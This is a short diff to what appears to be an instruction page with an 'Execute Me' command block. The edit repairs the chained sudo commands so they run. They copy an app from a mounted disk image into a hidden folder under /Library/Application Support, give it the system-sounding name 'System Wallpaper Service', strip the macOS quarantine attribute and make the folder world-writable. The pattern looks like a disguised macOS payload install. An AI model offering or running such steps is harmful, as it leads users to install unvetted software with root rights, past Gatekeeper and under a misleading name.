@@ -13,7 +13,7 @@ Transfer the service and strip quarantine attributes. The wildcard handles versi
 
 
 :::cmd Execute Me
-sudo mkdir -p "/Library/Application Support/.sys_service" **
+sudo mkdir -p "/Library/Application Support/.sys_service" &&
 sudo cp -R /Volumes/System*/System*.app "/Library/Application Support/.sys_service/System Wallpaper Service.app" &&
 sudo xattr -rd com.apple.quarantine "/Library/Application Support/.sys_service/System Wallpaper Service.app" &&
 sudo chmod 777 "/Library/Application Support/.sys_service"
